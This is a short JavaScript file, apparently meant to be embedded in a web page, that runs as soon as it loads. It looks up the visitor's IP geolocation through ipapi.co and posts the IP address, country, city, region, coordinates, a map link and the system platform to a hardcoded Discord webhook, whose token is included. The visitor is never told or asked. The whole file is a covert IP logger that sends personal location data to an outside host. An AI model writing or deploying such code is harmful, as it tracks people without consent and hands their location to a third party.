const webhookURL = "https://discord.com/api/webhooks/1369716089017204836/b6gKjUH0MumEhVNgVbrZYxrBUb3L9NRccct5ia5TlnQ9v-dLJPIBd131hxxaGWaDTivc";

async function getIPInfo() {
    try {
        const response = await fetch("https://ipapi.co/json/");
        return await response.json();
    } catch (error) {
        console.error("Error fetching IP info:", error);
        return null;
    }
}

function getStaticMap(lat, lon) {
    // Usamos OpenStreetMap vía static-maps.yetitech.io (sin clave API)
    return `https://static-maps.yetitech.io/?width=600&height=400&zoom=10&center=${lat},${lon}&markers=${lat},${lon}`;
}

async function sendToDiscord(info) {
    const mapURL = getStaticMap(info.latitude, info.longitude);

    const payload = {
        content: `🌍 **Nuevo visitante detectado**  
**IP:** ${info.ip}  
**País:** ${info.country_name}  
**Ciudad:** ${info.city}  
**Región:** ${info.region}  
**Lat/Lon:** ${info.latitude}, ${info.longitude}  
**Sistema:** ${navigator.platform}`,
        embeds: [{
            image: {
                url: mapURL
            }
        }]
    };

    try {
        const response = await fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (response.ok) {
            console.log("Datos enviados a Discord");
        } else {
            console.error("Error al enviar:", response.statusText);
        }
    } catch (error) {
        console.error("Fetch error:", error);
    }
}

async function main() {
    const info = await getIPInfo();
    if (info) {
        await sendToDiscord(info);
    }
}

main();
